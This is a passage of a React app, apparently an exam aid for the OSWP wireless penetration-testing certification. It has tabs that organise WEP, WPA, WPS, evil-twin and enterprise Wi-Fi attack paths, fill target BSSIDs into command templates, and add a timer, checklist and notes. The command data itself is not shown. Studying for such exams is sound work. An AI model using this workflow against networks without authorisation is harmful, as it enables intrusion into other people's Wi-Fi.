.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}.mile-now{color:var(--g);font-weight:600}
.qref-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all .15s;margin-bottom:4px}
.qref-card:hover{border-color:var(--ac);background:var(--b3)}
.score-bar{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default;min-width:120px}
.decision-box{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:14px}
.decision-box h3{color:var(--ac);font-size:14px;margin-bottom:12px}
.decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
.decision-btn:hover{border-color:var(--ac);background:var(--acd)}
.decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
.tshoot{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:8px;overflow:hidden}
.tshoot-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s;font-size:12px;font-weight:600;color:var(--t0)}
.tshoot-h:hover{background:var(--b3)}
.tshoot-a{border-top:1px solid var(--bd);padding:10px 14px}
`;

// ━━━ COMPONENTS ━━━
function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function PhaseList({phases,vals}){
  const[openP,setOpenP]=useState({0:true});
  const[openS,setOpenS]=useState({});
  const[doneS,setDoneS]=useState({});
  return(<div>{phases.map((phase,pi)=>{
    const isO=openP[pi]!==false;
    const allDone=phase.steps.every((_,si)=>doneS[`${pi}-${si}`]);
    return(<div className="phase" key={pi}>
      <div className="phase-h" onClick={()=>setOpenP(p=>({...p,[pi]:!p[pi]}))}>
        <div className={`phase-num ${allDone?'done':''}`}>{allDone?'✓':pi+1}</div>
        <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
        <span className={`arrow ${isO?'open':''}`}>▶</span>
      </div>
      {isO&&<div className="steps-wrap">{phase.steps.map((step,si)=>{
        const k=`${pi}-${si}`;const isExp=openS[k];const isDone=doneS[k];
        const cmdText=step.cmd(vals);
        return(<div className="step" key={si}>
          <div className="step-row" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
            <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[k]:!p[k]}))}}>{isDone?'✓':si+1}</div>
            <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
            <CopyBtn text={cmdText}/>
          </div>
          {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
        </div>)
      })}</div>}
    </div>)
  })}</div>)
}

// ━━━ TABS ━━━
function DecisionTab({vals}){
  const[mode,setMode]=useState(null);
  const chains={setup:SETUP_CHAIN,wep:WEP_CHAIN,wpa:WPA_CHAIN,rogue:ROGUE_CHAIN,enterprise:ENTERPRISE_CHAIN,wps:WPS_CHAIN,extra:EXTRA_CHAIN};
  const labels={setup:"📡 Setup & Recon",wep:"🔓 WEP Cracking",wpa:"🔑 WPA/WPA2 PSK",rogue:"👿 Evil Twin & Rogue AP",enterprise:"🏢 WPA Enterprise",wps:"📌 WPS Attacks",extra:"🛠️ Extra Techniques"};
  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>3 Network Scenarios</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Must crack 2 of 3 (1 mandatory)</div>
      <div className="score-seg" style={{background:'rgba(234,179,8,.1)',color:'var(--y)'}}>3h45m exam + 24h report</div>
    </div>
    <div className="decision-box">
      <h3>📡 What encryption did you identify?</h3>
      <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Select attack path based on airodump-ng recon. Always start with Setup & Recon.</p>
      {Object.entries(labels).map(([k,v])=>(
        <button key={k} className={`decision-btn ${mode===k?'active':''}`} onClick={()=>setMode(k)}>{v}</button>
      ))}
    </div>
    {!mode&&<PhaseList phases={SETUP_CHAIN} vals={vals}/>}
    {mode&&<PhaseList phases={chains[mode]} vals={vals}/>}
  </div>)
}

function QuickRefTab(){
  const[openS,setOpenS]=useState({});
  return(<div>{Object.entries(QUICK_REF).map(([cat,cmds])=>(
    <div key={cat}><div className="sec-title">{cat}</div>
    {cmds.map((c,i)=>{const k=`${cat}-${i}`;return(<div key={i}>
      <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
        <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{c.l}</span><CopyBtn text={c.c}/>
      </div>
      {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{c.c}</div></div>}
    </div>)})}</div>
  ))}</div>)
}

function ChecklistTab(){
  const[checked,setChecked]=useState({});
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(checked).filter(Boolean).length;
  const pct=total>0?Math.round(done/total*100):0;
  return(<div>
    <div style={{fontSize:11,color:'var(--t2)',marginBottom:6}}>{done}/{total} completed ({pct}%)</div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>=100?'var(--g)':pct>=70?'var(--y)':'var(--ac)'}}/></div>
    {Object.entries(CHECKLIST).map(([section,items])=>(
      <div key={section}><div className="sec-title">{section}</div>
      {items.map((item,i)=>{const k=`${section}-${i}`;const on=checked[k];return(
        <div key={i} className={`chk-item ${on?'done':''}`} onClick={()=>setChecked(p=>({...p,[k]:!p[k]}))}>
          <div className={`chk-box ${on?'on':''}`}>{on?'✓':''}</div><span>{item}</span>
        </div>)})}</div>
    ))}
  </div>)
}

function TimerTab(){
  const[running,setRunning]=useState(false);
  const[elapsed,setElapsed]=useState(0);
  const ref=useRef(null);
  const start=()=>{if(!running){setRunning(true);ref.current=setInterval(()=>setElapsed(e=>e+1),1000)}};
  const pause=()=>{setRunning(false);clearInterval(ref.current)};
  const reset=()=>{setRunning(false);clearInterval(ref.current);setElapsed(0)};
  useEffect(()=>()=>clearInterval(ref.current),[]);
  const hrs=Math.floor(elapsed/3600),mins=Math.floor((elapsed%3600)/60),secs=elapsed%60;
  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  const totalSec=3*3600+45*60,remaining=Math.max(0,totalSec-elapsed);
  const rH=Math.floor(remaining/3600),rM=Math.floor((remaining%3600)/60),rS=remaining%60;
  const remD=`${String(rH).padStart(2,'0')}:${String(rM).padStart(2,'0')}:${String(rS).padStart(2,'0')}`;
  const eH=elapsed/3600;
  return(<div>
    <div className="timer-bar">
      <div style={{fontSize:10,color:'var(--t2)',textAlign:'center',marginBottom:4}}>EXAM TIME (3h 45min)</div>
      <div className="timer-display">{display}</div>
      <div style={{fontSize:12,color:remaining<=900?'var(--r)':'var(--t2)',textAlign:'center',marginBottom:8}}>Remaining: {remD}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${Math.min(100,elapsed/totalSec*100)}%`,background:remaining<=900?'var(--r)':remaining<=1800?'var(--y)':'var(--ac)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={start}>▶ Start</button>
        <button className="timer-btn" onClick={pause}>⏸ Pause</button>
        <button className="timer-btn" onClick={reset}>↺ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const next=i<MILESTONES.length-1?MILESTONES[i+1]:null;
      const isCur=eH>=m.hour&&(!next||eH<next.hour);
      const passed=eH>=m.hour;
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={`mile-t ${isCur?'mile-now':''}`} style={{opacity:passed&&!isCur?.5:1}}>{isCur?'👉 ':''}{m.label}</div>
      </div>)
    })}
  </div>)
}

function TroubleshootTab(){
  const[open,setOpen]=useState({});
  return(<div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Common issues and solutions during the OSWP exam.</p>
    {TROUBLESHOOT.map((t,i)=>(<div className="tshoot" key={i}>
      <div className="tshoot-h" onClick={()=>setOpen(p=>({...p,[i]:!p[i]}))}>
        <span className={`arrow ${open[i]?'open':''}`}>▶</span>❓ {t.q}
      </div>
      {open[i]&&<div className="tshoot-a"><div className="cmd">{t.a}</div></div>}
    </div>))}
  </div>)
}

function NotesTab(){
  const[notes,setNotes]=useState(()=>localStorage.getItem('oswp-notes-v2')||`# OSWP Exam Notes\n\n## Network 1 (Mandatory)\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Network 2\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Network 3\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Screenshots Taken\n`);
  useEffect(()=>{localStorage.setItem('oswp-notes-v2',notes)},[notes]);
  return(<div>
    <p style={{fontSize:10,color:'var(--t2)',marginBottom:8}}>Notes saved to browser automatically.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=["🎯 Decision Engine","⚡ Quick Ref","✅ Checklist","⏱ Timer","🔧 Troubleshoot","📝 Notes"];

function App(){
  const[tab,setTab]=useState(0);
  const[iface,setIface]=useState("");
  const[bssid,setBssid]=useState("");
  const[essid,setEssid]=useState("");
  const[ch,setCh]=useState("");
  const[client,setClient]=useState("");
  const[cmac,setCmac]=useState("");
  const vals={iface,bssid,essid,ch,client,cmac};

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSWP Autopilot</div><div className="logo-sub">PEN-210 • Wireless Attack Engine</div></div>
        <div className="inps">
          <input className="inp" placeholder="Interface" value={iface} onChange={e=>setIface(e.target.value)} style={{width:80}}/>
          <input className="inp" placeholder="BSSID" value={bssid} onChange={e=>setBssid(e.target.value)} style={{width:140}}/>
          <input className="inp" placeholder="ESSID" value={essid} onChange={e=>setEssid(e.target.value)}/>
          <input className="inp" placeholder="Channel" value={ch} onChange={e=>setCh(e.target.value)} style={{width:60}}/>
          <input className="inp" placeholder="Client MAC" value={client} onChange={e=>setClient(e.target.value)} style={{width:130}}/>
          <input className="inp" placeholder="Your MAC" value={cmac} onChange={e=>setCmac(e.target.value)} style={{width:130}}/>
        </div>
      </div>
      <div className="tabs">{TABS.map((t,i)=><button key={i} className={`tab ${tab===i?'on':''}`} onClick={()=>setTab(i)}>{t}</button>)}</div>
      <div className="main">
        {tab===0&&<DecisionTab vals={vals}/>}
        {tab===1&&<QuickRefTab/>}
        {tab===2&&<ChecklistTab/>}
        {tab===3&&<TimerTab/>}
        {tab===4&&<TroubleshootTab/>}
        {tab===5&&<NotesTab/>}
      </div>
    </div>
  </>)
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
